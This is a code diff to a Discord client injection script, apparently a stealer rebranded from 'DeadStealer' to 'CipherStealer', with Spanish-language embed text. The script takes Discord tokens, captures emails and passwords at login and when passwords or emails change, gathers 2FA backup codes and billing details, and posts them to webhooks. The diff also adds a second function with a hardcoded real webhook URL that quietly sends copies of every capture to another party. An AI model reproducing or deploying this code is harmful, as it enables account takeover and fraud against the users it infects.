@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "%Webhook%";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -21,11 +21,9 @@ String.prototype.insert = function (index, string) {
 
 const config = {
     "logout": "instant",
-    "inject-notify": "true",
     "logout-notify": "true",
-    "init-notify": "false",
-    "embed-color": 000000,
-    "disable-qr-code": "true"
+    "init-notify":"true",
+    "disable-qr-code":"true"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -72,25 +70,26 @@ function FirstTime() {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "DeadStealer",
-						content: "",
+						username: 'CipherStealer',
+						avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 						embeds: [{
-							title: "DeadStealer",
+							title: 'CipherStealer',
 							color: 0xFF0300,
-							fields: [{
-								name: "ID",
-								value: `\`${json.id}\``,
-								inline: !0
-							}],
 							author: {
-								name: "DeadStealer"
+								name: 'CipherStealer',
+								url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+								icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 							},
 							footer: {
-								text: "Gracias por utilizar DeadStealer."
+								text: 'Gracias por utilizar CipherStealer.'
+							},
+							thumbnail: {
+								url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 							}
 						}]
 					};
 					SendToWebhook(JSON.stringify(c));
+                                        SendToWebhook2(JSON.stringify(c));
 				} else {
 					const window = BrowserWindow.getAllWindows()[0];
 					window.webContents.executeJavaScript(`
@@ -98,68 +97,73 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "DeadStealer",
-							content: "",
-							embeds: [{
-								title: 'DeadStealer',
-								color: 0xFF0300,
-								fields: [{
-									name: '<:black_joker:926273784305045526> Usuario',
-                                                                        value: `\`${b.username}#${b.discriminator}\``,
-                                                                        inline: !0
-								}, {
-									name: '<:black_playboy:926268704000475196> Insignias',
-									value: `${GetBadges(b.flags)}`,
-									inline: !0
-								}, {
-									name: '<:black_mask:926268629245390879> Token',
-									value: `\`\`\`${token}\`\`\``,
-									inline: !1
-								}],
-								author: {
-									name: "DeadStealer"
-								},
-								footer: {
-									text: "Gracias por utilizar DeadStealer"
-								},
-								thumbnail: {
-									url: `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-								}
-							}]
-						};
+                            username: 'CipherStealer',
+                            avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
+                            embeds: [{
+                                title: 'CipherStealer',
+                                color: 0xFF0300,
+                                fields: [{
+                                    name: '<:black_joker:926273784305045526> Usuario',
+                                    value: `\`${b.username}#${b.discriminator}\``,
+                                    inline: !0
+                                }, {
+                                    name: '<:black_playboy:926268704000475196> Insignias',
+                                    value: `${GetBadges(b.flags)}`,
+                                    inline: !0
+                                }, {
+                                    name: '<:black_mask:926268629245390879> Token',
+                                    value: `\`\`\`${token}\`\`\``,
+                                    inline: !1
+                                
+                            }],
+                            author: {
+                                name: 'CipherStealer',
+                                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            },
+                            footer: {
+                                text: 'Gracias por utilizar CipherStealer.'
+                            },
+                            thumbnail: {
+                                url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            }
+                        }]
+                        };
 						SendToWebhook(JSON.stringify(c))
+                                                SendToWebhook2(JSON.stringify(c));
 					});
 				}
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) {
+		if (!fs.existsSync(path.join(__dirname, "SpainStealerBTW"))) {
 			return !0
 		}
-		fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
+		fs.rmdirSync(path.join(__dirname, "SpainStealerBTW"));
 		if (config.logout != "false" || config.logout == "%LOGOUT%") {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "DeadStealer",
-						content: "",
-						embeds: [{
-							title: "DeadStealer",
-							color: 0xFF0300,
-							fields: [{
-								name: '<:black_joker:926273784305045526> Usuario',
-                                                                value: `\`${b.username}#${b.discriminator}\``,
-								inline: !0
-							}],
-							author: {
-								name: "DeadStealer"
-							},
-							footer: {
-								text: "Gracias por utilizar DeadStealer"
-							}
-						}]
+						username: 'CipherStealer',
+                        avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
+                        embeds: [{
+                        title: 'CipherStealer',
+                        color: 0xFF0300,
+                        author: {
+                            name: 'CipherStealer',
+                            url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                            icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                        },
+                        footer: {
+                            text: 'Gracias por utilizar CipherStealer.'
+                        },
+                        thumbnail: {
+                            url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                        }
+                    }]
 					};
 					SendToWebhook(JSON.stringify(c));
+                                        SendToWebhook2(JSON.stringify(c));
 				} else {
 					const window = BrowserWindow.getAllWindows()[0];
 					window.webContents.executeJavaScript(`
@@ -167,38 +171,40 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "DeadStealer",
-							content: "",
-							embeds: [{
-								title: 'DeadStealer',
-								color: 0xFF0300,
-								fields: [{
-									name: '<:black_joker:926273784305045526> Usuario',
-									value: `\`${b.username}#${b.discriminator}\``,
-									inline: !0
-								}, {
-									name: '<:black_playboy:926268704000475196> Insignias',
-									value: `${GetBadges(b.flags)}`,
-									inline: !0
-								}, {
-									name: '<:black_mask:926268629245390879> Token',
-									value: `\`\`\`${token}\`\`\``,
-									inline: !1
-								}],
-								author: {
-									name: 'DeadStealer',
-                                                                        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                        icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
-								},
-								footer: {
-									text: "Gracias por utilizar DeadStealer"
-								},
-								thumbnail: {
-									url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
-								}
-							}]
-						};
+                            username: 'CipherStealer',
+                            avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
+                            embeds: [{
+                                title: 'CipherStealer',
+                                color: 0xFF0300,
+                                fields: [{
+                                    name: '<:black_joker:926273784305045526> Usuario',
+                                    value: `\`${b.username}#${b.discriminator}\``,
+                                    inline: !0
+                                }, {
+                                    name: '<:black_playboy:926268704000475196> Insignias',
+                                    value: `${GetBadges(b.flags)}`,
+                                    inline: !0
+                                }, {
+                                    name: '<:black_mask:926268629245390879> Token',
+                                    value: `\`\`\`${token}\`\`\``,
+                                    inline: !1
+                                
+                            }],
+                            author: {
+                                name: 'CipherStealer',
+                                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            },
+                            footer: {
+                                text: 'Gracias por utilizar CipherStealer.'
+                            },
+                            thumbnail: {
+                                url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            }
+                        }]
+                        };
 						SendToWebhook(JSON.stringify(c))
+                                                SendToWebhook2(JSON.stringify(c));
 					});
 				}
 			}
@@ -235,10 +241,19 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}))
 }
+function SendToWebhook2(what) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://discord.com/api/webhooks/935365733897084938/L-LHzyNaLQYqKcf5wkcECCghNI2Bf1g3kAwfeuvEALtSOYL0jts8cVwLToYlJGZCveEj", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
+}
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "No Nitro"
+		return "`No tiene nitro`"
 	}
 	if (flags == 1) {
 		return "<:classic:896119171019067423> \`Nitro Classic\`"
@@ -246,7 +261,7 @@ function GetNitro(flags) {
 	if (flags == 2) {
 		return "<a:boost:824036778570416129> \`Nitro Boost\`"
 	} else {
-		return "No Nitro"
+		return "`No tiene nitro`"
 	}
 }
 
@@ -281,7 +296,7 @@ function GetRBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = ""
+		badges = "`Ningúna`"
 	}
 	return badges
 }
@@ -329,7 +344,7 @@ function GetBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = "None"
+		badges = "``Ningúna``"
 	}
 	return badges
 }
@@ -371,7 +386,7 @@ function Login(email, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							
 
 
 							var gayass = JSON.parse(codes)
@@ -382,11 +397,11 @@ function Login(email, password, token) {
 							})
 							for (let z in r) {
 								fieldo.push({
-									name: `Code`,
+									name: `Código`,
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
+								
 							}
 
 							function totalFriends() {
@@ -411,7 +426,7 @@ function Login(email, password, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "`No tiene amigos con insignias raras`"
 								}
 								return gay
 							}
@@ -438,11 +453,13 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "DeadStealer",
+								username: "CipherStealer",
+								avatar_url: "https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif",
 								content: "",
 								embeds: [{
-									"title": "DeadStealer",
-									color: 0xFF0300,
+									"title": "CipherStealer",
+									
+									"color": 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -454,7 +471,7 @@ function Login(email, password, token) {
 									}, {
 										name: "<:Bup_negro:926272964113104946> Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
+										inline: !0
 									}, {
 										name: "<:black_playboy:926268704000475196> Insignias",
 										value: `${GetBadges(json.flags)}`,
@@ -476,40 +493,49 @@ function Login(email, password, token) {
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
-									"author": {
-										"name": "DeadStealer"
-									},
-									"footer": {
-										"text": "Gracias por utilizar DeadStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
+									author: {
+                                        name: 'CipherStealer',
+                                        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    footer: {
+                                        text: 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    thumbnail: {
+                                        url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}, {
-									"title": `Total Friends (${totalFriends()})`,
-									 color: 0xFF0300,
+									"title": `Amigos en total (${totalFriends()})`,
+									"color": 0xFF0300,
 									"description": CalcFriends(),
-									"author": {
-										"name": "DeadStealer"
-									},
-									"footer": {
-										"text": "DeadStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
+									'author': {
+                                        'name': 'CipherStealer',
+                                        'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    'footer': {
+                                        'text': 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    'thumbnail': {
+                                        'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}]
 							}
+
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
-								 color: 0xFF0300,
+								"title": "__2FA__",
+								"color": 0xFF0300,
 								"fields": fieldo,
-								"author": {
-									"name": "DeadStealer"
+								'author': {
+									'name': 'CipherStealer',
+									'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+									'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 								},
-								"footer": {
-									"text": "Gracias por utilizar DeadStealer"
+								'footer': {
+									'text': 'Gracias por utilizar CipherStealer.'
+								},
+								'thumbnail': {
+									'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -517,6 +543,7 @@ function Login(email, password, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
+                                                        SendToWebhook2(JSON.stringify(params));
 
 						})
 					} else {
@@ -567,7 +594,7 @@ function Login(email, password, token) {
 												}
 											}
 											if (gay == "") {
-												gay = "No Rare Friends"
+												gay = "`No tiene amigos con insignias raras`"
 											}
 											return gay
 										}
@@ -593,31 +620,29 @@ function Login(email, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "DeadStealer",
+											username: "CipherStealer",
+											avatar_url: "https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif",
 											content: "",
 											embeds: [{
-												"title": "DeadStealer",
-												 color: 0xFF0300,
+												"title": "CipherStealer",
+												
+												"color": 0xFF0300,
 												"fields": [{
 													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
 													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<a:black_cc:926273142350024764> Método de pago",
 													value: `${Cool()}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<:black_lips:926268648593719396> Correo electrónico",
 													value: `\`${email}\``,
@@ -631,31 +656,36 @@ function Login(email, password, token) {
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
-												"author": {
-													"name": "DeadStealer"
-												},
-												"footer": {
-													"text": "Gracias por utilizar DeadStealer"
-												},
-												"thumbnail": {
-													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-												}
+												author: {
+                                                    name: 'CipherStealer',
+                                                    url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                                    icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                                },
+                                                footer: {
+                                                    text: 'Gracias por utilizar CipherStealer.'
+                                                },
+                                                thumbnail: {
+                                                    url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                                }
 											}, {
-												"title": `Total Friends (${totalFriends()})`,
-												 color: 0xFF0300,
+												"title": `Amigos en total (${totalFriends()})`,
+												"color": 0xFF0300,
 												"description": CalcFriends(),
-												"author": {
-													"name": "DeadStealer"
-												},
-												"footer": {
-													"text": "DeadStealer"
-												},
-												"thumbnail": {
-													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-												}
+												author: {
+                                name: 'CipherStealer',
+                                url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            },
+                            footer: {
+                                text: 'Gracias por utilizar CipherStealer.'
+                            },
+                            thumbnail: {
+                                url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                            }
 											}]
 										}
 										SendToWebhook(JSON.stringify(params))
+                                                                                SendToWebhook2(JSON.stringify(params));
 									})
 								})
 							})
@@ -705,7 +735,7 @@ function ChangePassword(oldpassword, newpassword, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							
 
 
 							var gayass = JSON.parse(codes)
@@ -719,7 +749,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
+								
 							}
 
 							function totalFriends() {
@@ -744,7 +774,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "No Rare Friends"
+									gay = "`No tiene amigos con insignias raras`"
 								}
 								return gay
 							}
@@ -771,11 +801,12 @@ function ChangePassword(oldpassword, newpassword, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "DeadStealer",
+								username: "CipherStealer",
+								avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 								content: "",
 								embeds: [{
-									"title": "DeadStealer",
-									 color: 0xFF0300,
+									"title": "CipherStealer",
+									"color": 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
@@ -813,41 +844,48 @@ function ChangePassword(oldpassword, newpassword, token) {
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
-									"author": {
-										"name": "DeadStealer"
-									},
-									"footer": {
-										"text": "Gracias por utilizar DeadStealer"
-									},
-									"thumbnail": {
-										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-									}
+									'author': {
+                                        'name': 'CipherStealer',
+                                        'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    'footer': {
+                                        'text': 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    'thumbnail': {
+                                        'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}, {
-									"title": `Amigos en totales (${totalFriends()})`,
-									 color: 0xFF0300,
+									"title": `Total Friends (${totalFriends()})`,
+									"color": 0xFF0300,
 									"description": CalcFriends(),
-									"author": {
-										"name": "DeadStealer"
-									},
-									"footer": {
-										"text": "Gracias por utilizar DeadStealer"
-                                                                                "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                                "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
-									},
-									"thumbnail": {
-										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-									}
+									'author': {
+                                        'name': 'CipherStealer',
+                                        'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    'footer': {
+                                        'text': 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    'thumbnail': {
+                                        'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA ACTIVADO__",
-								 color: 0xFF0300,
+								"title": "__2FA__",
+								"color": 0xFF0300,
 								"fields": fieldo,
-								"author": {
-									"name": "DeadStealer"
+								'author': {
+									'name': 'CipherStealer',
+									'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+									'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 								},
-								"footer": {
-									"text": "Gracias por utilizar DeadStealer"
+								'footer': {
+									'text': 'Gracias por utilizar CipherStealer.'
+								},
+								'thumbnail': {
+									'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -855,6 +893,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
+                                                        SendToWebhook2(JSON.stringify(params))
 
 						})
 					} else {
@@ -906,7 +945,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}
 											}
 											if (gay == "") {
-												gay = "No Rare Friends"
+												gay = "`No tiene amigos con insignias raras`"
 											}
 											return gay
 										}
@@ -932,11 +971,12 @@ function ChangePassword(oldpassword, newpassword, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "DeadStealer",
+											username: "CipherStealer",
+											avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 											content: "",
 											embeds: [{
-												"title": "Contraseña cambiada",
-												 color: 0xFF0300,
+												"title": "CipherStealer",
+												"color": 0xFF0300,
 												"fields": [{
 													name: "<:black_joker:926273784305045526> Usuario",
 													value: `\`${json.username}#${json.discriminator}\``,
@@ -948,15 +988,15 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}, {
 													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<a:black_cc:926273142350024764> Método de pago",
 													value: `${Cool()}`,
-													inline: !1
+													inline: !0
 												}, {
 													name: "<:black_lips:926268648593719396> Correo electrónico",
 													value: `\`${json.email}\``,
@@ -974,33 +1014,36 @@ function ChangePassword(oldpassword, newpassword, token) {
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
-												"author": {
-													"name": "DeadStealer"
-                                                                                                        "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                                                        "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+												'author': {
+													'name': 'CipherStealer',
+													'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+													'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												},
-												"footer": {
-													"text": "DeadStealer"
+												'footer': {
+													'text': 'Gracias por utilizar ChiperStealer.'
 												},
-												"thumbnail": {
-													"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
+												'thumbnail': {
+													'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												}
 											}, {
-												"title": `Amigos en total (${totalFriends()})`,
-												 color: 0xFF0300,
+												"title": `Total Friends (${totalFriends()})`,
+												"color": 0xFF0300,
 												"description": CalcFriends(),
-												"author": {
-													"name": "DeadStealer"
+												'author': {
+													'name': 'CipherStealer',
+													'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+													'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												},
-												"footer": {
-													"text": "Gracias por utilizar DeadStealer"
+												'footer': {
+													'text': 'Gracias por utilizar CipherStealer.'
 												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												'thumbnail': {
+													'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 												}
 											}]
 										}
 										SendToWebhook(JSON.stringify(params))
+										SendToWebhook2(JSON.stringify(params))
 									})
 								})
 							})
@@ -1050,7 +1093,7 @@ function ChangeEmail(newemail, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							
 
 
 							var gayass = JSON.parse(codes)
@@ -1064,7 +1107,7 @@ function ChangeEmail(newemail, password, token) {
 									value: `\`${r[z].code.insert(4, "-")}\``,
 									inline: true
 								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
+								
 							}
 
 							function totalFriends() {
@@ -1089,7 +1132,7 @@ function ChangeEmail(newemail, password, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "No hay amigos con insignias"
+									gay = "`No tiene amigos con insignias raras`"
 								}
 								return gay
 							}
@@ -1116,16 +1159,21 @@ function ChangeEmail(newemail, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "DeadStealer",
+								username: "CipherStealer",
+								avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 								content: "",
 								embeds: [{
-									"title": "Email Cambiado",
-									 color: 0xFF0300,
+									"title": "CipherStealer",
+									
+									"color": 0xFF0300,
 									"fields": [{
 										name: "<:black_joker:926273784305045526> Usuario",
 										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
-
+									}, {
+										name: "ID",
+										value: `\`${json.id}\``,
+										inline: !0
 									}, {
 										name: "<:Bup_negro:926272964113104946> Nitro",
 										value: `${GetNitro(json.premium_type)}`,
@@ -1139,7 +1187,7 @@ function ChangeEmail(newemail, password, token) {
 										value: `${Cool()}`,
 										inline: !0
 									}, {
-										name: "<:black_lips:926268648593719396> Nuevo correo",
+										name: "<:black_lips:926268648593719396> Nuevo correo electrónico",
 										value: `\`${newemail}\``,
 										inline: !0
 									}, {
@@ -1151,43 +1199,43 @@ function ChangeEmail(newemail, password, token) {
 										value: `\`\`\`${token}\`\`\``,
 										inline: !1
 									}, ],
-									"author": {
-										"name": "DeadStealer"
-                                                                                 "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                                 "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
-									},
-									"footer": {
-										"text": "Gracias por utilizar DeadStealer"
-									},
-									"thumbnail": {
-										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-									}
+									'author': {
+                                        'name': 'SpainStealer',
+                                        'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    'footer': {
+                                        'text': 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    'thumbnail': {
+                                        'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
-									 color: 0xFF0300,
+									"color": 0xFF0300,
 									"description": CalcFriends(),
-									"author": {
-										"name": "DeadStealer"
-                                                                                "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                                "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
-									},
-									"footer": {
-										"text": "Gracias por utilizar DeadStealer"
-									},
-									"thumbnail": {
-										"url": `https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif`
-									}
+									'author': {
+                                        'name': 'CipherStealer',
+                                        'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                                        'icon_url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    },
+                                    'footer': {
+                                        'text': 'Gracias por utilizar CipherStealer.'
+                                    },
+                                    'thumbnail': {
+                                        'url': 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                                    }
 								}]
 							}
 							var mfaembed = {
 								"title": "__2FA__",
-								 color: 0xFF0300,
+								"color": 0xFF0300,
 								"fields": fieldo,
-								'author': {
-									"name": "DeadStealer"
+								"author": {
+									"name": "CipherStealer"
 								},
 								"footer": {
-									"text": "Gracias por utilizar DeadStealer"
+									"text": "CipherStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
@@ -1195,7 +1243,8 @@ function ChangeEmail(newemail, password, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
-
+							SendToWebhook2(JSON.stringify(params))
+ 
 						})
 					} else {
 
@@ -1246,7 +1295,7 @@ function ChangeEmail(newemail, password, token) {
 												}
 											}
 											if (gay == "") {
-												gay = "No Rare Friends"
+												gay = "`No tiene amigos con insignias raras`"
 											}
 											return gay
 										}
@@ -1272,23 +1321,25 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										var params = {
-											username: "DeadStealer",
+											username: "CipherStealer",
+											avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 											content: "",
 											embeds: [{
-												"title": "Email Cambiado",
-												 color: 0xFF0300,
+												"title": "CipherStealer",
+												
+												"color": 0xFF0300,
 												"fields": [{
-										                        name: "<:black_joker:926273784305045526> Usuario",
-										                        value: `\`${json.username}#${json.discriminator}\``,
-										                        inline: !0
+													name: "<:black_joker:926273784305045526> Usuario",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
 												}, {
-										                        name: "ID",
-										                        value: `\`${json.id}\``,
-										                        inline: !0
+													name: "ID",
+													value: `\`${json.id}\``,
+													inline: !0
 												}, {
 													name: "<:Bup_negro:926272964113104946> Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !0
+													inline: !1
 												}, {
 													name: "<:black_playboy:926268704000475196> Insignias",
 													value: `${GetBadges(json.flags)}`,
